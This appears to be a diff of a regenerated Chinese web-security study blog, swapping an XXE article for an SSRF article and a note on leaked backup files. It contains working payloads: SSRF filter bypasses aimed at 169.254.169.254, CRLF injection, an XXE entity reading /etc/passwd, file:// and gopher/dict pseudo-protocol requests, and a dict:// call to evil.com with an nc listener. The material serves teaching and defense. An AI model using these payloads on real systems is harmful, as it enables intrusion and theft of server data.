-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以尝试采用http基本身份认证的方式绕过</span><br><span class="line">如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异</span><br><span class="line">在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。</span><br></pre></td></tr></table></figure></blockquote>
-<p><strong>2.采用短网址绕过</strong></p>
-<blockquote>
-<p>比如百度短地址<a target="_blank" rel="noopener" href="https://dwz.cn/">https://dwz.cn/</a></p>
-</blockquote>
-<p><strong>3.采用进制转换</strong></p>
-<blockquote>
-<p>127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p>
-</blockquote>
-<p><img src="/.com//image-20250520030023-ukm1uls.png" alt="image"></p>
-<p><strong>4.利用特殊域名</strong></p>
-<blockquote>
-<p>原理是DNS解析。<strong>xip.io</strong>可以指向任意域名，即<br>127.0.0.1.xip.io，可解析为127.0.0.1<br>(xip.io 现在好像用不了了，可以找找其他的)</p>
-</blockquote>
-<p><strong>5.利用[::]</strong></p>
-<blockquote>
-<p>可以利用[::]来绕过localhost<br><a target="_blank" rel="noopener" href="http://169.254.169.254/%3E/%3Ehttp://[::169.254.169.254]">http://169.254.169.254\&gt;\&gt;http://[::169.254.169.254]</a></p>
-</blockquote>
-<p><strong>6.利用句号</strong></p>
-<blockquote>
-<p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p>
-</blockquote>
-<p><strong>7、CRLF 编码绕过</strong></p>
-<blockquote>
-<p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a </span><br></pre></td></tr></table></figure>
-
-<p><strong>8.利用封闭的字母数字</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com</span><br><span class="line">http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳</span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇</span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛</span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵</span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ</span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ</span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴</span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>
-
-<p>二、常见限制</p>
-<p>1.限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名</p>
-<blockquote>
-<p>采用http基本身份认证的方式绕过，即@<br><a target="_blank" rel="noopener" href="http://www.xxx.com@www.xxc.com/">http://www.xxx.com@www.xxc.com</a></p>
-</blockquote>
-<p>2.限制请求IP不为内网地址</p>
-<blockquote>
-<p>当不允许ip为内网地址时：<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p>
-</blockquote>
-<p>3.限制请求只为http协议</p>
-<blockquote>
-<p>（1）采取302跳转<br>（2）采取短地址</p>
-</blockquote>
-<hr>
-<h2 id="八、SSRF漏防御"><a href="#八、SSRF漏防御" class="headerlink" title="八、SSRF漏防御"></a>八、SSRF漏防御</h2><p>通常有以下5个思路：</p>
-<p>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
-<p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
-<p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p>
-<p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p>
-<p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/SSRF/" data-id="cmaxy8gbh0005kg7kdm60erqf" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/" data-id="cmaxygi1k004eoc7kczxm8ern" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -826,7 +581,39 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" data-id="cmaxy8gbh0006kg7k5sz7ec9k" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" data-id="cmaxygi0h0004oc7k3fogg629" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Web/备份文件" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/05/20/Web/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/" class="article-date">
+  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="备份文件"><a href="#备份文件" class="headerlink" title="备份文件"></a>备份文件</h1><h1 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h1><p>题目经常需要进行代码审计，不过有时候不会把源码直接给我们，而是要我们自己发现。备份文件就是常见的源码泄露的方式，实践中往往是开发者的疏忽而忘记删除备份文件，从而导致服务器中残留源码。我们可以通过访问这些备份文件来审计代码，一般情况下可以用后台扫描工具扫描。例如 index.php，PHP 文件常见的备份文件格式有：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">index.phps</span><br><span class="line">index.php.swp</span><br><span class="line">index.php.swo</span><br><span class="line">index.php.php~</span><br><span class="line">index.php.bak</span><br><span class="line">index.php.txt</span><br><span class="line">index.php.old</span><br></pre></td></tr></table></figure>
+
+<p>​<code>d9d1c4d9e0d995cec9ac9f94995da89cc4a692a895a39ca69a669993a09dc6d4c6aac5cdc6a99c9569ad</code>​</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6/" data-id="cmaxygi0i0005oc7k4hxecxj7" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -1072,7 +859,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/RCE%EF%BC%88%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/" data-id="cmaxy8gbi0009kg7kgjfk9m1e" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/05/20/Web/RCE%EF%BC%88%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/" data-id="cmaxygi0j0006oc7k9fe9fg05" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -1084,9 +871,9 @@
 
 
   
-    <article id="post-Web/XXE（XML外部实体注入）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-Web/SSRF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/05/20/Web/XXE%EF%BC%88XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%EF%BC%89/" class="article-date">
+    <a href="/2025/05/20/Web/SSRF/" class="article-date">
   <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
 </a>
     
@@ -1096,78 +883,366 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="XXE（XML外部实体注入）"><a href="#XXE（XML外部实体注入）" class="headerlink" title="XXE（XML外部实体注入）"></a>XXE（XML外部实体注入）</h1><h2 id="XXE是什么？"><a href="#XXE是什么？" class="headerlink" title="XXE是什么？"></a>XXE是什么？</h2><blockquote>
-<p><strong>XXE（XML外部实体注入）</strong> 是一种针对应用程序<strong>处理XML数据</strong>的方式的攻击。在这种攻击中，攻击者<strong>利用应用程序</strong>对<strong>XML输入</strong>的<strong>处理不当</strong>，<strong>引入或“注入”</strong> 恶意内容。这可能<strong>导致未授权的数据访问、服务拒绝攻击甚至执行远程代码</strong>。</p>
+        <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="一、SSRF是什么？"><a href="#一、SSRF是什么？" class="headerlink" title="一、SSRF是什么？"></a>一、SSRF是什么？</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
+<p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+<hr>
+<h2 id="二、SSRF漏洞原理"><a href="#二、SSRF漏洞原理" class="headerlink" title="二、SSRF漏洞原理"></a>二、SSRF漏洞原理</h2><p><span data-type="text" style="background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);">SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</span></p>
+<p><img src="/.com//image-20250520025641-k2sfyci.png" alt="image"></p>
+<p>比如,黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p>
+<hr>
+<h2 id="三、SSRF漏洞挖掘"><a href="#三、SSRF漏洞挖掘" class="headerlink" title="三、SSRF漏洞挖掘"></a>三、SSRF漏洞挖掘</h2><p>1、分享：通过URL地址分享网页内容</p>
+<p><img src="/.com//image-20250520025700-u9pjgmi.png" alt="image"></p>
+<p>2、转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览:由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。</p>
+<p>3、在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等。</p>
+<p><img src="/.com//image-20250520025709-vdxc2ye.png" alt="image"></p>
+<p>4、图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a></p>
 </blockquote>
-<p><img src="/.com//75546efaeffc13568dbf8842e9ee9cff-20250422220641-6fmtypu.png" alt="75546efaeffc13568dbf8842e9ee9cff">​</p>
-<h2 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h2><blockquote>
-<p>&#x3D;&#x3D;XML（可扩展标记语言）&#x3D;&#x3D;是一种常用于Web应用程序的数据格式。XML文档可以&#x3D;&#x3D;定义实体&#x3D;&#x3D;，它们是存储文档中其他地方重复使用的数据的方式。外部实体是一种特殊类型的实体，它们的内容被定义在XML文档外部。</p>
-<p>XXE漏洞发生在当应用程序解析含有外部实体引用的XML文档时，没有正确地限制或禁止这些外部实体的使用。攻击者可以利用这一点，通过构造包含恶意外部实体的XML文档，来实现攻击目的。</p>
+<p>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p>
+<p>5、未公开的api实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p>
+<p><img src="/.com//image-20250520025722-dq5eksz.png" alt="image"></p>
+<p>6、图片加载与下载:通过URL地址加载或下载图片，图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。</p>
+<p>(此处可能会有人有疑问，为什么加载图片服务器上的图片也会有问题，直接使用img标签不就好了?没错是这样，但是开发者为了有更好的用户体验通常对图片做些微小调整例水印、压缩等所以就可能造成SSRF问题)。</p>
+<p>7、从URL关键字中寻找<br>利用google 语法加上这些关键字去寻找SSRF漏洞</p>
+<blockquote>
+<p>share<br>wap<br>url<br>link<br>src<br>source<br>target<br>u<br>display<br>sourceURl<br>imageURL<br>domain</p>
 </blockquote>
-<h2 id="XXE漏洞案例讲解"><a href="#XXE漏洞案例讲解" class="headerlink" title="XXE漏洞案例讲解"></a>XXE漏洞案例讲解</h2><h3 id="案例：读取服务器文件"><a href="#案例：读取服务器文件" class="headerlink" title="案例：读取服务器文件"></a>案例：读取服务器文件</h3><ul>
-<li><strong>场景</strong>：一个Web应用程序允许用户上传XML文件来更新个人配置。</li>
-<li><strong>攻击方法</strong>：攻击者创建一个XML文件，其中包含一个外部实体，该实体引用了服务器上的敏感文件（例如<code>/etc/passwd</code>​）。</li>
-</ul>
-<p><strong>XML示例</strong>：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>简单来说：所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞</p>
+<hr>
+<h2 id="四、产生SSRF漏洞的函数"><a href="#四、产生SSRF漏洞的函数" class="headerlink" title="四、产生SSRF漏洞的函数"></a>四、产生SSRF漏洞的函数</h2><p>SSRF攻击可能存在任何语言编写的应用，接下来将举例&#x3D;&#x3D;php&#x3D;&#x3D;中可能存在SSRF漏洞的函数。</p>
+<p><strong>1、file_get_contents:</strong></p>
+<p>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="variable">$filename</span> =<span class="string">&#x27;./images/&#x27;</span>.rand().<span class="string">&#x27;;img1.jpg&#x27;</span>; </span><br><span class="line">file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span>); </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="variable">$img</span> = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$img</span>; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p><strong>结果</strong>：当服务器处理此XML文件时，外部实体<code>xxe</code>​被解析，导致<code>/etc/passwd</code>​文件的内容被插入到XML文档中，并返回给攻击者。</p>
-<p><img src="/.com//d93dbb9792be3727da5e6a2d56d6f996-20250422222618-5n0s782.png" alt="d93dbb9792be3727da5e6a2d56d6f996">​</p>
-<h5 id="漏洞利用影响"><a href="#漏洞利用影响" class="headerlink" title="漏洞利用影响"></a>漏洞利用影响</h5><ul>
-<li>攻击者可以读取服务器上的任意文件，这可能导致敏感信息泄露。</li>
-<li>在某些情况下，攻击者还可以利用XXE漏洞发起服务拒绝（DoS）攻击，甚至执行远程代码。</li>
-</ul>
-<h4 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h4><ul>
-<li><strong>禁用外部实体</strong>：在解析XML时禁用外部实体的处理。</li>
-<li><strong>限制XML解析器功能</strong>：配置XML解析器，以最小化处理不必要功能，例如禁用DTD（文档类型定义）。</li>
-<li><strong>输入验证</strong>：对输入的XML数据进行严格的验证，确保没有恶意构造的内容。</li>
-<li><strong>错误处理</strong>：确保错误处理机制不会泄露敏感信息。</li>
-</ul>
-<p><img src="/.com//d93dbb9792be3727da5e6a2d56d6f996-20250422222618-5n0s782.png" alt="dc7b47612a2ffd945abc66ff52d915f7"></p>
-<h4 id="XXE-的危害"><a href="#XXE-的危害" class="headerlink" title="XXE 的危害"></a>XXE 的危害</h4><ol>
-<li><p><strong>敏感数据泄露</strong>：</p>
-<ul>
-<li>XXE攻击可以使攻击者读取服务器上的文件，包括配置文件、源代码、密码文件等，从而泄露敏感信息。</li>
-</ul>
-</li>
-<li><p><strong>内部系统扫描</strong>：</p>
-<ul>
-<li>攻击者可以利用XXE攻击探测内部网络，识别内部服务和应用，从而为进一步的攻击提供信息。</li>
-</ul>
-</li>
-</ol>
-<ul>
-<li><p><strong>服务器端请求伪造（SSRF）</strong> ：</p>
-<ul>
-<li>通过XXE攻击，攻击者可能能够迫使服务器与内部系统或外部服务器进行交互，可能导致数据泄露或其他安全问题。</li>
-</ul>
-</li>
-<li><p><strong>执行远程代码和命令</strong>：</p>
-<ul>
-<li>在某些情况下，特别是当解析器支持强大的功能时，XXE攻击可以用于执行远程代码或系统命令，从而完全控制受影响的服务器。</li>
-</ul>
-</li>
-<li><p><strong>拒绝服务攻击（DoS）</strong> ：</p>
-<ul>
-<li>XXE攻击可以用于发起拒绝服务攻击，例如通过指向大量消耗资源的外部实体或构造庞大的XML文档来耗尽服务器资源。</li>
-</ul>
-</li>
-<li><p><strong>绕过防火墙</strong>：</p>
-<ul>
-<li>攻击者可以利用XXE漏洞绕过直接从外部网络访问内部网络资源的限制。</li>
-</ul>
-</li>
-<li><p><strong>植入恶意内容</strong>：</p>
-<ul>
-<li>在某些情况下，XXE漏洞可以被用来植入恶意内容到系统中，影响数据的完整性。</li>
-</ul>
-</li>
-</ul>
+<p><strong>2、sockopen():</strong></p>
+<p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">function</span> GetFile(<span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span>) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, intval(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, 30); </span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$errstr</span> (error number <span class="variable">$errno</span>) \n&quot;</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;GET <span class="variable">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="variable">$host</span>\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123; </span><br><span class="line"><span class="variable">$contents</span>.= fgets(<span class="variable">$fp</span>, 1024); </span><br><span class="line">&#125; </span><br><span class="line">fclose(<span class="variable">$fp</span>); </span><br><span class="line"><span class="built_in">return</span> <span class="variable">$contents</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3、curl_exec():</strong></p>
+<p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意事项</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class="line">file_get_contents的gopher协议不能URL编码</span><br><span class="line">file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</span><br><span class="line">curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</span><br><span class="line">curl_exec() 默认不跟踪跳转，</span><br><span class="line">file_get_contents() file_get_contents支持php://input协议</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、SSRF中URL的伪协议"><a href="#五、SSRF中URL的伪协议" class="headerlink" title="五、SSRF中URL的伪协议"></a>五、SSRF中URL的伪协议</h2><p>当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file:/// 从文件系统中获取文件内容，如，file:///etc/passwd</span><br><span class="line">dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：</span><br><span class="line">sftp:// SSH文件传输协议或安全文件传输协议</span><br><span class="line">ldap:// 轻量级目录访问协议</span><br><span class="line">tftp:// 简单文件传输协议</span><br><span class="line">gopher:// 分布式文档传递服务，可使用gopherus生成payload</span><br></pre></td></tr></table></figure>
+
+<p><strong>1、file</strong></p>
+<p>这种URL Schema可以尝试从文件系统中获取文件：</p>
+<blockquote>
+<p><a href="http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini">http://example.com/ssrf.php?url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini</a></p>
+</blockquote>
+<p>如果该服务器阻止对外部站点发送HTTP请求，或启用了白名单防护机制，只需使用如下所示的URL Schema就可以绕过这些限制：</p>
+<p><strong>2、dict</strong></p>
+<p>这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表：</p>
+<blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/ssrf.php?dict://evil.com:1337/</span><br><span class="line">evil.com:$ nc -lvp 1337</span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]</span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure></blockquote>
+<p><strong>3、sftp</strong></p>
+<p>在这里，Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。</p>
+<blockquote>
